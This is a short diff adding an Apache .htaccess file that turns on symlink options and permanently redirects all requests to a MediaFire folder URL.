@@ -1,0 +1,4 @@
+#Options +FollowSymLinks
+Options +SymLinksIfOwnerMatch
+RewriteEngine on
+RewriteRule ^(.*)$ http://www.mediafire.com/folder/inbkdjmie89hm/overlay [R=301,L]
